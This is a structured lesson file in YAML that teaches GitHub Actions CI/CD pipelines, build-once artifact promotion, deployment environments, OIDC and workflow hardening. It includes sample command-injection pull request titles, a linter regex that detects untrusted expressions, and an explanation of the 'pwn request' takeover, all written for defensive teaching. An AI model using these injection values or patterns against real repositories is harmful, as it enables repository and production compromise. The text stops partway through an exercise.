concepts:
  - id: cicd-pipeline-anatomy
    name: A deployment pipeline for a web app
    summary: Continuous integration merges small changes often and checks each one automatically; continuous delivery keeps every change deployable at the push of a button; continuous deployment deploys every change that passes. In GitHub Actions the pipeline is a workflow of jobs - parallel unless joined with needs - whose length is set by its slowest path. Caches, timeouts, concurrency groups and path filters keep the feedback fast and cheap.
  - id: cicd-build-once-promote
    name: Build once, promote the same artifact
    summary: Build the deployable artifact once, from one commit, test that artifact and promote it unchanged from staging to production - configuration changes per environment, the bytes do not. Artifacts (kept and passed between jobs) are not caches (best-effort speed-ups). Environments with protection rules and a deploy gate decide which run may deploy which artifact where.
  - id: cicd-workflow-security
    name: Hardening the workflow itself
    summary: A workflow holds tokens and secrets and runs code from outside, so it is an attack surface. Give GITHUB_TOKEN least privilege per job, pin third-party actions to full commit SHAs or a lockfile, never expand untrusted context values into run scripts, never check out a pull request's code in a privileged pull_request_target workflow, keep secrets out of caches, and replace stored cloud keys with OIDC short-lived credentials.

objectives:
  - Explain the difference between continuous integration, continuous delivery and continuous deployment, and say which one a given team is doing.
  - Read and write a GitHub Actions workflow for a React, Express and PostgreSQL app - triggers, jobs, needs, a matrix, caching, timeouts and concurrency - and find its critical path from real job timings.
  - Explain why a pipeline should build the artifact once and promote it, and tell a cache from an artifact.
  - Design the gate in front of a deploy job - event, branch, green needs, artifact identity, staging proof, protection rules - and implement it as a tested function.
  - Find and fix the common workflow vulnerabilities - broad token permissions, unpinned actions, script injection, untrusted checkout in pull_request_target, secrets in caches - and write a linter that reports them.
  - Explain how OIDC lets a deploy job reach a cloud provider without a stored long-lived key, and what the cloud side must check.

sections:
  - id: intuition
    kind: intuition
    concepts: [cicd-pipeline-anatomy, cicd-build-once-promote]
    title: The idea in plain language
    body: |
      Think of a **bakery that supplies cafés**. Every time a baker changes a recipe, a small batch is baked
      and tasted at once (continuous integration - nobody saves up a month of recipe changes and hopes they
      still work together). Each tasted batch is boxed, labelled with the recipe version and **sealed**. The
      sealed box goes to one test café first; only if customers there are happy does the *same sealed box* go
      to every café (build once, promote). Nobody re-bakes "the same recipe" for the big cafés - re-baking
      could come out differently.

      The bakery can ship any sealed box any day, but the owner chooses when (continuous delivery). A bolder
      bakery ships every box that passes tasting, automatically (continuous deployment).

      And the delivery van has keys to every café. If a stranger can leave a note in the van that the driver
      obeys - "also drop by this address" - the whole chain is compromised. That is **workflow security**: the
      pipeline holds the keys to production, so it needs locks of its own.

      As a tester you have mostly met the pipeline as "the place my tests run". This lesson is the developer's
      view: how the pipeline that **ships** the app is built, and how to review one.

  - id: what
    kind: what
    concepts: [cicd-pipeline-anatomy]
    title: CI, continuous delivery and continuous deployment
    body: |
      Martin Fowler's definitions (*Continuous Delivery*, bliki, 2013), which follow Humble and Farley's book:

      | Practice | What it means | The test |
      | --- | --- | --- |
      | **Continuous integration** | Everyone integrates small changes into the main line often; every integration is built and tested automatically. | Is `main` green most of the time, and is a red `main` fixed first? |
      | **Continuous delivery** | "You build software in such a way that the software can be released to production at any time." Deployment is push-button; the business chooses when. | Could you deploy the current `main` now, "and nobody would bat an eyelid"? |
      | **Continuous deployment** | "Every change goes through the pipeline and automatically gets put into production." | Does a merge reach production with no human step? |

      Fowler: "In order to do Continuous Deployment you must be doing Continuous Delivery." "CI/CD" in job
      adverts usually means a pipeline that does CI and at least delivery.

      **GitHub Actions vocabulary** (the platform this lesson uses - other CI systems have the same ideas):

      | Term | Meaning |
      | --- | --- |
      | **Workflow** | A YAML file in `.github/workflows/`, triggered by events (`on:` push, pull_request, workflow_dispatch, schedule...). |
      | **Job** | A set of steps on one fresh runner. Jobs run **in parallel** unless `needs:` orders them. |
      | **Step** | A shell command (`run:`) or an action (`uses: owner/repo@ref`). Steps in a job share the runner's disk. |
      | **Artifact** | Files a job uploads to keep (evidence, the built site) or to hand to a later job. |
      | **Cache** | Files (the npm cache) restored by key to save time. Best effort - may be missing. |
      | **Environment** | A named deploy target (`staging`, `production`) with its own secrets, variables and protection rules. |
      | **`GITHUB_TOKEN`** | A token GitHub creates for each job, limited to this repository and to the `permissions:` you grant. |

      **DORA's delivery metrics** describe how well a pipeline serves a team: throughput (change lead time,
      deployment frequency, failed deployment recovery time) and instability (change fail rate, deployment
      rework rate). DORA's research finds "speed and stability are not tradeoffs" - top performers do well on
      all of them.

  - id: why
    kind: why
    concepts: [cicd-pipeline-anatomy, cicd-build-once-promote, cicd-workflow-security]
    title: Why developers own the pipeline
    body: |
      - **Small batches are safer.** A deploy of one change has one suspect when it breaks; a monthly release
        has forty. Fowler lists "reduced deployment risk" as the first benefit of continuous delivery.
      - **Feedback time is development time.** A 40-minute pipeline means every fix costs 40 minutes before
        anyone knows if it worked. Keeping it fast is engineering work - caching, parallel jobs, the right
        tests at the right layer.
      - **"Works on my machine" ends at the runner.** The runner starts empty, with exactly the versions the
        workflow names. A missing lock file, an unpinned Node version or an undeclared environment variable
        shows up here first.
      - **The pipeline holds the keys.** A deploy job can write to production; the token can push to the
        repository; secrets sit in memory. A compromised action or an injected command in a workflow is a
        production compromise - GitHub's security guidance says such vulnerabilities "can be exploited to
        take over a repository".
      - **Interviews ask.** "Walk me through your pipeline", "how do you deploy safely?" and "how do you
        keep secrets out of CI?" are standard questions for full stack roles.

  - id: anatomy
    kind: internals
    concepts: [cicd-pipeline-anatomy]
    title: The shape of a web app pipeline, and how jobs depend on each other
    body: |
      A typical pipeline for this course's stack:

      1. **On every pull request:** install with `npm ci` (exactly the lock file), then static checks
         (typecheck, lint, format), unit and component tests, API tests against a real PostgreSQL (PGlite or
         a service container), build the front end and the server. A few minutes, required to merge.
      2. **On push to `main`:** the same checks, then **build the deployable artifact once** (a static
         bundle, a server bundle, a container image) and keep it.
      3. **Deploy to staging** with that artifact, run smoke tests and a few end-to-end journeys against it.
      4. **Promote to production** - the same artifact - automatically (continuous deployment) or after an
         approval (continuous delivery).

      **How jobs combine (GitHub Actions):**

      - Jobs without `needs` start together, each on its own runner. A job with `needs: [check, practice]`
        waits for both.
      - "If a job fails or is skipped, all jobs that need it are skipped unless the jobs use a conditional
        expression that causes the job to continue." The default condition is `success()`.
      - A downstream job can read `needs.<job_id>.result` - one of `success`, `failure`, `cancelled` or
        `skipped` - and `needs.<job_id>.outputs` (at most 1 MB per job).
      - A **matrix** (`strategy.matrix`) runs one job definition with several values - Node versions,
        browsers, shards. At most 256 jobs per run; `fail-fast` defaults to `true`, cancelling the rest of
        the matrix when one fails.

      **The critical path.** A run takes as long as its slowest chain of `needs`, not the sum of all jobs.
      This repository's run 43570568369 (commit 14f5919, 14 November 2026), from the REST API:

      | Job | Started | Finished | Duration |
      | --- | --- | --- | --- |
      | `check` (npm ci 8 s, `npm run check` 6 min 26 s) | 07:19:40 | 07:26:26 | 6 min 46 s |
      | `practice` (Java, Maven, Selenium 2 min 58 s, Playwright 2 min 7 s, full stack 2 min 23 s) | 07:19:41 | 07:28:53 | 9 min 12 s |
      | `deploy` (`deploy-pages` 7 s) | 07:28:57 | 07:29:07 | 10 s |

      The run took 9 min 30 s (07:19:38 to 07:29:08). `check` and `practice` ran in parallel, and `deploy`
      needs both, so **`practice` is the critical path**: making `check` twice as fast would not ship the
      site one second sooner; splitting `practice` into parallel jobs would.

      **Keeping it fast and cheap:**

      | Tool | What it does | Note |
      | --- | --- | --- |
      | `cache: npm` on `actions/setup-node` | Restores npm's download cache keyed on the lock file | Caches the npm cache, **not** `node_modules`; `npm ci` still installs. |
      | `actions/cache` | Any path, by `key` with fallback `restore-keys` | Unused entries evicted after 7 days; 10 GB per repository by default. |
      | `concurrency` + `cancel-in-progress` | At most one running run per group; cancel the older one | This repository cancels only for pull requests - never a half-finished deploy. |
      | `timeout-minutes` | Cancels a hung job | Default **360** minutes. |
      | `paths` / `paths-ignore` | Skip a workflow when only other files changed | A skipped required check stays **Pending** and blocks the merge. |

  - id: visual-pipeline
    kind: visual
    concepts: [cicd-pipeline-anatomy, cicd-build-once-promote]
    title: "Diagram: one artifact from commit to production"
    body: |
      ```mermaid
      flowchart LR
        PR[Pull request] --> CI[check job - typecheck, lint, unit, API, build]
        CI -->|required check| M[Merge to main]
        M --> B[build job - artifact built once, digest recorded]
        B --> ST[deploy to staging - environment staging]
        ST --> SM{Smoke tests on staging pass?}
        SM -- no --> STOP[Stop - production unchanged]
        SM -- yes --> AP{Protection rules - approval, branch, wait timer}
        AP -- approved --> PRD[deploy the SAME artifact to production]
      ```

      Notice that there is **one** build box. Staging and production both receive its output; only their
      configuration differs. The two diamonds are gates: one automatic (smoke tests), one a protection rule on
      the `production` environment.

  - id: workflow-code
    kind: code
    concepts: [cicd-pipeline-anatomy, cicd-build-once-promote]
    title: "Code: a pipeline for the SandPay dashboard"
    body: |
      A workflow for a React + Express + PostgreSQL app (SandPay is fictional; the hosting step is left as a
      placeholder because it depends on your platform). Action SHAs are the ones the `v4` tags pointed at on
      14 November 2026 - resolve your own.

      ```yaml
      name: Dashboard CI/CD
      on:
        pull_request:
        push:
          branches: [main]

      permissions:
        contents: read            # every job starts read-only; jobs ask for more

      concurrency:
        group: ${{ github.workflow }}-${{ github.ref }}
        cancel-in-progress: ${{ github.event_name == 'pull_request' }}

      jobs:
        check:
          runs-on: ubuntu-latest
          timeout-minutes: 15
          strategy:
            matrix:
              node: [22, 24]       # the versions you support
          steps:
            - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
            - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
              with:
                node-version: ${{ matrix.node }}
                cache: npm
            - run: npm ci
            - run: npm run typecheck && npm run lint
            - run: npm test               # unit, component and API tests (PGlite)

        build:
          if: github.event_name == 'push'
          needs: check
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
            - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
              with:
                node-version-file: .nvmrc
                cache: npm
            - run: npm ci
            - run: npm run build
            - uses: actions/upload-artifact@v4   # pin this one too - left as a tag to show the finding
              with:
                name: dashboard-${{ github.sha }}
                path: dist
                retention-days: 30

        deploy-staging:
          needs: build
          runs-on: ubuntu-latest
          timeout-minutes: 10
          environment: staging
          steps:
            - uses: actions/download-artifact@v4
              with:
                name: dashboard-${{ github.sha }}
            - run: echo "deploy ./dist to staging with your platform's CLI"   # placeholder
            - run: npm run smoke -- --base-url "$STAGING_URL"
              env:
                STAGING_URL: ${{ vars.STAGING_URL }}

        deploy-production:
          needs: deploy-staging
          runs-on: ubuntu-latest
          timeout-minutes: 10
          environment:
            name: production       # protection rules: required reviewers, main only
            url: https://dashboard.sandpay.example
          steps:
            - uses: actions/download-artifact@v4
              with:
                name: dashboard-${{ github.sha }}
            - run: echo "deploy the same ./dist to production"                # placeholder
      ```

      This is **illustrative**: the smoke script and the deploy commands are placeholders, and the
      `download-artifact` / `upload-artifact` steps are left on tags so the audit in the practice exercise has
      something to find.

  - id: line-by-line
    kind: line-by-line
    concepts: [cicd-pipeline-anatomy, cicd-build-once-promote, cicd-workflow-security]
    title: Why the important lines are written that way
    body: |
      - **`permissions: contents: read`** at the top: "If you specify the access for any of these permissions,
        all of those that are not specified are set to `none`." Every job starts with a read-only token.
      - **`cancel-in-progress` only for pull requests:** a newer push to a pull request makes the older run
        pointless; cancelling a half-finished deploy on `main` could leave production between two versions.
        This repository's own workflow uses the same expression.
      - **`timeout-minutes`** on every job: without it a hung browser or a test waiting on a port holds a
        runner for 360 minutes.
      - **The matrix** runs `check` on Node 22 and 24 in parallel. It only belongs where you really support
        both; the build uses `.nvmrc`, the one version production runs.
      - **`cache: npm`** speeds up `npm ci` by restoring npm's download cache keyed on `package-lock.json`.
        `npm ci` still installs exactly the lock file - the cache never decides *what* is installed.
      - **`if: github.event_name == 'push'`** on `build`: pull requests are checked but never built for
        deployment. Combined with `on.push.branches: [main]`, only `main` produces deployable artifacts.
      - **`name: dashboard-${{ github.sha }}`**: the artifact is named after the commit, so both deploy jobs
        download the bytes built from that commit - nothing is rebuilt.
      - **`environment: production`**: "All deployment protection rules must pass before a job referencing
        the environment is sent to a runner", and environment secrets are only available to jobs that reference
        the environment - after approval, if reviewers are required.
      - **`vars.STAGING_URL`** passes a non-secret setting through `env:`, not by expanding `${{ }}` inside the
        script - a habit that also defeats script injection (below).

  - id: build-once
    kind: internals
    concepts: [cicd-build-once-promote]
    title: Build once, promote - and caches are not artifacts
    body: |
      Humble and Farley's rule is **only build your binaries once**: the artifact that passed the tests is the
      one that ships. Rebuilding "the same commit" for production is a different build - a dependency range, a
      registry outage, a tool update or a build-time variable can change the bytes. Then production runs
      something no test ever saw.

      What changes between environments is **configuration** - URLs, keys, feature flags - read at run time
      (the [deployment lesson](#/lesson/deployment-and-configuration) covers how). A front end that bakes
      `API_URL` into the bundle at build time breaks this rule: you'd need one build per environment. Serve
      configuration from the server or a `config.json` instead.

      **Identity of an artifact.** The commit SHA says what source it came from; a **content digest** (for a
      container image, `sha256:...`) says exactly which bytes it is. Production should check that it is
      deploying the digest that staging tested.

      **Artifact or cache?** They look alike (upload files, get them back) and are not interchangeable:

      | | Artifact | Cache |
      | --- | --- | --- |
      | Purpose | Keep the output of a run: the build, test evidence | Speed up a later run |
      | Guaranteed? | Yes, for its retention (default 90 days, 1-90) | No - evicted after 7 days unused or when over the size limit |
      | Scope | The run (and download via API) | Branch-scoped: the current branch, the default branch, a pull request's base |
      | Content | Your build output | Re-creatable inputs: npm cache, browsers |
      | Secrets? | Never | Never - "anyone who can open a pull request ... can read the contents of caches in the base branch" |

      A pipeline that passes its build between jobs through `actions/cache` will one day find the cache
      evicted - and quietly rebuild, or fail. Pass builds as artifacts.

      **Promotion gates.** The deploy job should refuse to run unless: the trigger is one that may deploy
      (`push` to `main` or a manual `workflow_dispatch` - never `pull_request`), every job it needs succeeded
      (`skipped` proved nothing), the artifact was built from this commit, and - for production - staging ran
      the same digest and its smoke tests passed. Some of that is GitHub configuration (deployment branches,
      required reviewers); the rest is your own check. The practice exercise writes it as a function.

  - id: environments
    kind: internals
    concepts: [cicd-build-once-promote]
    title: Environments and deployment protection rules (GitHub)
    body: |
      An environment is set up under the repository's settings and referenced by a job with `environment:`.
      Its rules run **before** the job gets a runner:

      | Rule | What it does | Note |
      | --- | --- | --- |
      | **Required reviewers** | Up to six users or teams; one approval lets the job proceed | Option to prevent self-review: whoever triggered the deploy can't approve it |
      | **Wait timer** | Delay of 1 to 43,200 minutes (30 days) | Not billed as runner time |
      | **Deployment branches and tags** | No restriction, protected branches only, or selected name patterns | Matched against `GITHUB_REF`; `*` doesn't match `/` |
      | **Custom rules** | A GitHub App (monitoring, change management) approves or rejects | Public preview at the time of writing; at most 6 rules enabled per environment |
      | **Admin bypass** | Administrators may bypass by default | Can be turned off per environment |

      **Environment secrets** are available only to jobs that reference the environment - and, with required
      reviewers, only after approval. That is how a production key stays out of the `check` job and out of
      every pull request.

      **Plan limits (GitHub-specific):** on GitHub Free, Pro and Team, required reviewers and wait timers are
      available for **public** repositories only; on GitHub Free, environment secrets need a public repository
      too. Check the current documentation for your plan.

      This repository's `deploy` job uses the `github-pages` environment, with
      `url: ${{ steps.deployment.outputs.page_url }}` - which is why the deployment shows up with a link on the
      repository's page.

  - id: security
    kind: internals
    concepts: [cicd-workflow-security]
    title: Hardening the workflow - the six findings that matter
    body: |
      GitHub's *Secure use reference* and *Script injections* pages, condensed into what a reviewer looks for:

      **1. Broad token permissions.** Set the default to read (`permissions: contents: read` at the top) and
      grant more per job - `pages: write` and `id-token: write` only on the deploy job, as this repository
      does. `permissions: write-all` gives every step every scope. Note that "any user with write access to
      your repository has read access to all secrets configured in your repository" - least privilege applies
      to the secrets themselves too.

      **2. Unpinned actions.** `uses: actions/checkout@v4` runs whatever commit the tag points to **today**.
      "A tag can be moved or deleted if a bad actor gains access to the repository storing the action." The
      fix: pin to a **full-length commit SHA** (keep the version in a comment), and let Dependabot propose
      updates. GitHub now also offers a **workflow dependency lockfile** - `.github/workflows/actions.lock`,
      generated by the `gh actions-lock` extension, recording the commit and the repository identity of every
      action including transitive ones; for workflows onboarded to it, "SHA pinning within workflow files is
      no longer necessary". It does not pin reusable workflows called with `jobs.<id>.uses` - pin those by SHA.

      **3. Script injection.** Before a `run:` script executes, every `${{ }}` in it is replaced by its value -
      text, pasted into a shell script. A pull request titled `a"; ls $GITHUB_WORKSPACE"` turns
      `title="${{ github.event.pull_request.title }}"` into a command (GitHub's own example). Untrusted values
      include titles, bodies, commit messages, labels, e-mail addresses and **branch names** - contexts that
      "typically end with `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`,
      `page_name`, `ref`, and `title`". The fix: pass them through `env:` and use `"$TITLE"`, or give them to
      an action as an input.

      **4. Untrusted code in a privileged workflow.** `pull_request_target` (and `workflow_run`) run in the
      context of the base repository - with its secrets, a token that may write, and the default branch's
      cache. That is safe only while they never run the pull request's code. `actions/checkout` with
      `ref: ${{ github.event.pull_request.head.sha }}` followed by `npm ci` or a build runs the attacker's
      `package.json` scripts with your secrets: the "pwn request". For building and testing pull requests use
      plain `pull_request` - for fork pull requests "secrets are not passed to the runner" and the token is
      read-only.

      **5. Secrets in caches and logs.** Caches are readable by anyone who can open a pull request. Secrets are
      redacted from logs only when the runner can find the exact value - "never use structured data as a
      secret", and register derived values (a signed JWT) with `::add-mask::`.

      **6. No timeout.** Not a vulnerability in itself, but a hung job burns six hours of runner time and keeps
      a deploy concurrency group blocked.

      **Cache poisoning protection (GitHub).** Only trusted triggers (`push`, `workflow_dispatch`,
      `repository_dispatch`, `delete`, `registry_package`, `page_build`, `schedule`) may create or overwrite
      caches in the default branch's scope; `pull_request_target`, `issue_comment` and `workflow_run` get
      read-only access there.

  - id: oidc
    kind: internals
    concepts: [cicd-workflow-security, cicd-build-once-promote]
    title: OIDC - deploying to a cloud without a stored key
    body: |
      The old way: create a cloud access key, paste it into a repository secret, and let every run present it.
      The key never expires unless someone rotates it, and anyone who can make a job print or send it owns
      your cloud account.

      With **OpenID Connect**:

      1. You configure a trust in the cloud provider: "tokens issued by `https://token.actions.githubusercontent.com`
         whose subject is `repo:<owner>/<repo>:environment:production` may assume the deploy role".
      2. The job has `permissions: id-token: write` and asks GitHub's OIDC provider for a JWT. Its claims
         describe the run - `sub`, `repository`, `ref`, `environment`, `workflow`, `job_workflow_ref`,
         `run_id`...
      3. The job presents the JWT to the cloud; the cloud checks the issuer, the audience and the subject
         conditions, then returns **short-lived** credentials "only valid for a single job".

      The security lives in step 1's conditions: a trust that accepts any branch, or any repository of the
      owner, lets a pull request branch or another repository deploy. Bind it to the environment (or to
      `refs/heads/main`) and the repository. GitHub-specific detail: repositories created after 15 July 2026
      use an **immutable** subject format that includes owner and repository IDs
      (`repo:octo-org@123456/octo-repo@456789:ref:refs/heads/main`), so a recycled name can't match.

      An illustrative job using one provider's action (`aws-actions/configure-aws-credentials`, v6.3.0 in its
      README; the role ARN and region are placeholders - not run here):

      ```yaml
      deploy-production:
        needs: deploy-staging
        runs-on: ubuntu-latest
        timeout-minutes: 10
        environment: production
        permissions:
          contents: read
          id-token: write          # may request the OIDC JWT - nothing else
        steps:
          - uses: aws-actions/configure-aws-credentials@v6.3.0   # pin by SHA in real use
            with:
              role-to-assume: <role ARN trusted for this repository's production environment>
              aws-region: <region>
      ```

      This repository's own `deploy` job asks for `id-token: write` too: `actions/deploy-pages` uses the OIDC
      token to prove to GitHub Pages where the deployment comes from.

  - id: audit-code
    kind: code
    concepts: [cicd-workflow-security]
    title: "Real output: auditing this repository's own workflow"
    body: |
      The practice exercise builds a small linter for these findings. Its reference solution, run against
      `.github/workflows/pages.yml` on 14 November 2026 (Node v24.21.0):

      ```plaintext
      unpinned-action  check step 1: actions/checkout@v4 is not pinned to a commit SHA
      unpinned-action  check step 2: actions/setup-node@v4 is not pinned to a commit SHA
      unpinned-action  check step 5: actions/upload-artifact@v4 is not pinned to a commit SHA
      unpinned-action  check step 6: actions/upload-pages-artifact@v3 is not pinned to a commit SHA
      unpinned-action  practice step 1: actions/checkout@v4 is not pinned to a commit SHA
      unpinned-action  practice step 2: actions/setup-java@v4 is not pinned to a commit SHA
      unpinned-action  practice step 6: actions/setup-node@v4 is not pinned to a commit SHA
      unpinned-action  practice step 9: actions/upload-artifact@v4 is not pinned to a commit SHA
      no-timeout       deploy: no timeout-minutes - a hung job runs for the default 360 minutes
      unpinned-action  deploy step 1: actions/deploy-pages@v4 is not pinned to a commit SHA
      ```

      Read it as a reviewer: the workflow already does the important things - a read-only default token,
      `pages: write` and `id-token: write` only on `deploy`, no untrusted values in scripts, no
      `pull_request_target`. What remains is nine tag references (all first-party `actions/*` - the "trust the
      creator" case, still movable) and one missing timeout. And the tags are old: `v4` while `checkout` was
      at v7.0.1 - an update tool such as Dependabot would have raised that.

      The core of the script-injection rule:

      ```typescript
      const UNTRUSTED_EXPRESSION =
        /\$\{\{[^}]*\b(github\.head_ref|github\.event\.[\w.*[\]'"-]*\b(body|default_branch|email|head_ref|label|message|name|page_name|ref|title))\b[^}]*\}\}/;

      if (typeof step.run === 'string' && UNTRUSTED_EXPRESSION.test(step.run)) {
        findings.push({ rule: 'script-injection', job: jobId, step: position, detail: '...' });
      }
      ```

      It reads only `run:` - the same value under `env:` is the **fix**, so it must not be reported. A real
      tool (CodeQL's Actions queries, OpenSSF Scorecard, zizmor) knows many more contexts and rules; this one
      is for learning what they look for.

  - id: steps
    kind: steps
    concepts: [cicd-pipeline-anatomy, cicd-build-once-promote, cicd-workflow-security]
    title: Reviewing a workflow pull request, step by step
    body: |
      1. **Triggers.** Which events run it? Any `pull_request_target` or `workflow_run`? If so, does it check
         out or run code from the pull request? (It must not.)
      2. **Permissions.** Is there a top-level `permissions:` with read-only defaults? Which jobs ask for more,
         and does each really need it?
      3. **Third-party code.** Is every `uses:` pinned to a full SHA or covered by a lockfile? Are new actions
         from a source you would trust with your secrets?
      4. **Scripts.** Does any `run:` expand `${{ }}` values that an outsider can set? Move them to `env:`.
      5. **Secrets.** Which jobs see which secrets? Production secrets only in the production environment?
         Anything secret written to a cache, an artifact or the log?
      6. **Deploy path.** Does the deploy job need every check? Can a `skipped` or `cancelled` job let it
         through (`always()`)? Is the artifact the one built from this commit?
      7. **Speed and cost.** Timeouts on every job, concurrency for pull requests, caching keyed on the lock
         file, the critical path known.
      8. **Evidence.** Test results and traces uploaded on failure, with a sensible retention.

  - id: example
    kind: example
    concepts: [cicd-build-once-promote, cicd-pipeline-anatomy]
    title: "Real-world example: a failed check stops the deploy"
    body: |
      This repository's only failed run of its 21 (run 38203570623, commit 3ab6d17, 12 October 2026) shows
      the gates working. From the REST API's job and step conclusions:

      | Job | Conclusion | Steps of note |
      | --- | --- | --- |
      | `check` | failure | `Run npm run check` - failure; `Upload the site` - skipped |
      | `practice` | success | `Keep test evidence when something fails` - skipped (nothing failed) |
      | `deploy` | skipped | never ran |

      Three mechanisms at once:

      - In `check`, steps after the failure have the default `success()` condition, so `Upload the site` was
        skipped - no site artifact was produced from a failing commit.
      - `Keep test evidence when something fails` in `check` has `if: failure()`, so it ran and kept
        `test-results` for seven days (it doesn't appear among the skipped steps).
      - `deploy` has `needs: [check, practice]`; one failed, so it was skipped. The live site kept the
        previous good version.

      What a tester checks in such a pipeline: that a red check really leaves production untouched (here: the
      deploy job's conclusion is `skipped` and the Pages deployment list has no new entry), and that the
      evidence of the failure is downloadable.

  - id: tests
    kind: tests
    concepts: [cicd-build-once-promote, cicd-workflow-security]
    title: Testing the pipeline itself
    body: |
      A pipeline is code; test it like code - on a branch or a fork, before relying on it.

      | Case | How | Expected result and evidence |
      | --- | --- | --- |
      | A failing test blocks the deploy | Push a branch with a deliberately failing test; open a pull request | `check` fails, merge blocked by the required check; no deploy job run |
      | A pull request never deploys | Open a pull request touching the front end | `build` and both deploy jobs skipped; no environment deployment created |
      | Production needs approval | Merge to `main` | `deploy-production` waits for review; approving as the person who merged is refused if self-review is prevented |
      | The same artifact is promoted | Compare the artifact digest in the staging and production deploy logs | Identical digests; no build step in either deploy job |
      | A fork pull request gets no secrets | Open a pull request from a fork that prints whether a secret is set (never the value) | Secret empty; the token can't write |
      | Injection is not possible | Open a pull request titled `x"; echo INJECTED; echo "` | `INJECTED` never appears as command output in any job |
      | A hung job is cancelled | A test that sleeps past `timeout-minutes` on a branch | Job cancelled at the timeout |
      | A cancelled run on main doesn't half-deploy | Push twice quickly to `main` | The first deploy finishes (no cancel-in-progress on `main`) |

      Static checks belong in the pipeline too: a workflow linter on every change to `.github/workflows/`,
      and `CODEOWNERS` so those files need a designated reviewer.

  - id: mistakes
    kind: mistakes
    concepts: [cicd-pipeline-anatomy, cicd-build-once-promote, cicd-workflow-security]
    title: Common mistakes, and a debugging method
    body: |
      - **`if: always()` on a deploy job.** It runs even when its needs failed or were cancelled. Use the
        default, or `if: ${{ !cancelled() && needs.check.result == 'success' }}` when you need a condition.
      - **Rebuilding for production.** "Build" in the production job means production runs bytes nobody tested.
      - **Passing the build through `actions/cache`.** Caches are evicted; use artifacts.
      - **Caching `node_modules` keyed on the branch.** Stale or poisoned installs. Cache npm's download cache
        keyed on the lock file and run `npm ci`.
      - **`npm install` in CI.** It can change the lock file; `npm ci` installs it exactly or fails.
      - **Path filters on a required check.** Skipped by `paths`, the check stays "Pending" and blocks merges.
      - **Secrets in `${{ }}` inside `run:`.** Works, but the value is pasted into the script file; use
        `env:`.
      - **`pull_request_target` "to get secrets for fork pull requests"** plus a checkout of the head - the
        classic repository takeover.
      - **One giant job.** Fifteen sequential minutes where three parallel jobs would take six.
      - **Front-end config baked at build time** - a build per environment, which breaks build-once.

      **Debugging method for a pipeline that misbehaves:**

      1. Read the **run summary**: which job failed, which were skipped, and why (a skip follows a failed
         `need`, an `if:` or a filter).
      2. Open the failing step's log; rerun the job with debug logging if the cause is hidden.
      3. Reproduce locally with the same command and versions (`.nvmrc`, `npm ci`) - most failures are not CI
         failures, they are test failures CI found.
      4. If it passes locally, list what differs on the runner: clean checkout (untracked files you rely on),
         time zone, CPU count, missing environment variables, cache state.
      5. Use the REST API (`/actions/runs/<id>/jobs`) to compare step timings across runs when "it got slow".

  - id: tradeoffs
    kind: tradeoffs
    concepts: [cicd-pipeline-anatomy, cicd-build-once-promote, cicd-workflow-security]
    title: Trade-offs
    body: |
      - **Continuous deployment vs delivery.** Deploying every merge needs trust in the tests, monitoring and
        a fast rollback; a manual approval adds safety and lead time. Fowler: delivery "just means that you are
        able to do frequent deployments but may choose not to".
      - **Matrix breadth vs cost.** Every Node version and browser multiplies runner minutes; test the
        versions you support, not every version that exists.
      - **SHA pins vs readability.** SHAs are unreadable and need an update tool; a lockfile keeps workflows
        readable but is another file and tool to manage. Tags are convenient and movable.
      - **Change freezes.** Fewer deploys in a risky period, but bigger batches afterwards - DORA's research
        says speed and stability go together, so freezes are team policy, not a best practice.
      - **GitHub-hosted vs self-hosted runners.** Self-hosted runners are faster to warm and can reach private
        networks, but they are not isolated per job - GitHub warns that environment secrets there need the same
        care as repository secrets.
      - **Pipeline as the only path.** Making the pipeline the only way to production (no laptop deploys) is
        what makes all of the above enforceable - and makes the pipeline worth attacking. Harden it.

  - id: summary
    kind: summary
    concepts: [cicd-pipeline-anatomy, cicd-build-once-promote, cicd-workflow-security]
    title: Summary and quick reference
    body: |
      - **CI** - integrate small changes often, each checked automatically. **Continuous delivery** - always
        deployable, push-button. **Continuous deployment** - every passing change deploys.
      - Jobs are parallel unless joined by `needs`; a failed or skipped need skips the job. The run takes as
        long as its **critical path**.
      - `npm ci`, `cache: npm` on the lock file, `timeout-minutes` on every job, `concurrency` with
        `cancel-in-progress` for pull requests only.
      - **Build once, promote:** one artifact named by commit and identified by digest, staging then
        production; configuration per environment, not per build.
      - **Artifacts** are kept outputs; **caches** are best-effort speed-ups - never pass builds or secrets
        through caches.
      - **Environments:** required reviewers, wait timers, deployment branches, environment secrets.
      - **Hardening:** read-only default token, write per job; pin actions to SHAs or a lockfile; untrusted
        values through `env:`; no pull request code in `pull_request_target`; OIDC instead of stored cloud keys.

exercises:
  - id: delivery-or-deployment
    type: mcq
    concept: cicd-pipeline-anatomy
    skill: application
    title: Which practice is this team doing?
    prompt: |
      A team merges to `main` several times a day; every merge is built, tested and deployed to staging
      automatically. Production deploys happen when the product owner presses "Approve" on the `production`
      environment - usually twice a week, but any commit on `main` could go at any time. Which describes them
      best?
    options:
      - id: delivery
        text: Continuous delivery - every change is deployable at the push of a button; the business chooses when.
        feedback: Correct - the software can be released at any time, with a human deciding when. That is Fowler's continuous delivery.
      - id: deployment
        text: Continuous deployment - their pipeline deploys automatically.
        feedback: It deploys to staging automatically, but continuous deployment means every passing change goes to production with no human step. Here a person approves.
      - id: ci-only
        text: Only continuous integration - deploying twice a week is not continuous.
        feedback: Delivery is about being able to deploy any commit on demand, not about how often you choose to. They can, so they do more than CI.
      - id: none
        text: None - a manual approval means it is not CI/CD.
        feedback: A manual decision before production is exactly what separates continuous delivery from continuous deployment; it doesn't undo the CI and the automated pipeline.
    correct: [delivery]
    hints:
      - Could any commit on main go to production today?
      - Who decides when it goes?
    solution: |
      **Continuous delivery.** Integration is continuous, every change is automatically built and deployed
      to staging, and production is push-button for any commit - but a person chooses when. To become
      continuous deployment, the approval would be replaced by automated checks, and every passing change
      would ship.
    followUp: |
      The same team wants to move to continuous deployment. Name three things they need in place first and why.

  - id: critical-path
    type: mcq
    concept: cicd-pipeline-anatomy
    skill: analysis
    title: Which change ships the site sooner?
    prompt: |
      In this repository's run 43570568369, `check` took 6 min 46 s (`npm run check` 6 min 26 s), `practice`
